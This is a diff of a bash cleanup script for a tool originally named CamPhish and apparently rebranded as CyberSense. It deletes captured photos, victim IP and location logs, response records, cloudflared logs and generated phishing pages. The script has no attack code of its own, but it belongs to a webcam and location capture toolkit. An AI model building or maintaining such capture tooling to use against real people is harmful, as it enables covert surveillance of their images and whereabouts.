@@ -1,39 +1,94 @@
 #!/bin/bash
-# Cleanup script for CamPhish
-# Removes all unnecessary files and logs
+# CyberSense Cleanup Script
+# Clears all captured data, photos, QR codes, logs, and generated files
 
-echo "Starting cleanup of unnecessary files and logs..."
+GREEN='\e[1;92m'
+YELLOW='\e[1;93m'
+RESET='\e[0m'
 
-# Remove log files
-echo "Removing log files..."
-rm -f *.log
-rm -f .cloudflared.log
+echo ""
+printf "${GREEN}[*] CyberSense Cleanup${RESET}\n"
+echo "────────────────────────────────"
 
-# Remove temporary location files
-echo "Removing temporary location files..."
-rm -f location_*.txt
-rm -f current_location.bak
+removed=0
 
-# Remove captured images
-echo "Removing captured images..."
-rm -f cam*.png
+remove_files() {
+  local pattern="$1"
+  local label="$2"
+  local count
+  count=$(ls $pattern 2>/dev/null | wc -l)
+  if [[ $count -gt 0 ]]; then
+    rm -f $pattern 2>/dev/null
+    printf "${GREEN}[+]${RESET} Removed ${count} ${label}\n"
+    removed=$((removed + count))
+  fi
+}
 
-# Remove temporary HTML files
-echo "Removing temporary HTML files..."
-rm -f index.php
-rm -f index2.html
-rm -f index3.html
-
-# Clean saved locations directory but keep the directory itself
-echo "Cleaning saved locations directory..."
-if [ -d "saved_locations" ]; then
-    rm -f saved_locations/*
+# Photos folder (captured images)
+if [[ -d "photos" ]]; then
+  count=$(ls photos/*.png 2>/dev/null | wc -l)
+  if [[ $count -gt 0 ]]; then
+    rm -f photos/*.png 2>/dev/null
+    printf "${GREEN}[+]${RESET} Removed ${count} photo(s) from photos/\n"
+    removed=$((removed + count))
+  fi
 fi
 
-# Remove any other temporary files
-echo "Removing other temporary files..."
-rm -f LocationLog.log
-rm -f LocationError.log
-rm -f Log.log
+# Root-level stray cam*.png (legacy)
+remove_files "cam*.png" "stray captured image(s)"
 
-echo "Cleanup completed successfully!" 
+# QR code
+remove_files "qrcode*.png" "QR code(s)"
+remove_files "qr*.png" "QR image(s)"
+
+# Response data
+if [[ -f "responses.jsonl" ]]; then
+  lines=$(wc -l < responses.jsonl)
+  rm -f responses.jsonl
+  printf "${GREEN}[+]${RESET} Removed responses.jsonl (${lines} records)\n"
+  removed=$((removed + 1))
+fi
+
+# Quiz answers (legacy)
+remove_files "quiz_answers.jsonl" "quiz answers file(s)"
+
+# Generated files (recreated by camphish.sh each run)
+remove_files "index.php" "generated index.php"
+remove_files "index2.html" "generated index2.html"
+remove_files "index3.html" "generated index3.html"
+
+# Logs
+remove_files "Log.log" "capture log(s)"
+remove_files "*.log" "log file(s)"
+remove_files ".cloudflared.log" "cloudflared log"
+remove_files "ip.txt" "IP log(s)"
+
+# Concurrency logs directory
+if [[ -d "ip_logs" ]]; then
+  count=$(ls ip_logs/*.txt 2>/dev/null | wc -l)
+  rm -rf ip_logs
+  printf "${GREEN}[+]${RESET} Removed ip_logs directory (${count} files)\n"
+  removed=$((removed + 1))
+fi
+
+# Location files (legacy)
+remove_files "location_*.txt" "location file(s)"
+remove_files "current_location.txt" "location tracker"
+remove_files "current_location.bak" "location backup"
+remove_files "saved.ip.txt" "saved IP file"
+remove_files "saved.locations.txt" "saved locations file"
+
+# Saved locations directory (legacy)
+if [[ -d "saved_locations" ]]; then
+  rm -rf saved_locations
+  printf "${GREEN}[+]${RESET} Removed saved_locations directory\n"
+  removed=$((removed + 1))
+fi
+
+echo "────────────────────────────────"
+if [[ $removed -eq 0 ]]; then
+  printf "${YELLOW}[!] Nothing to clean — already clean.${RESET}\n"
+else
+  printf "${GREEN}[✓] Done! Removed ${removed} item(s) total.${RESET}\n"
+fi
+echo ""
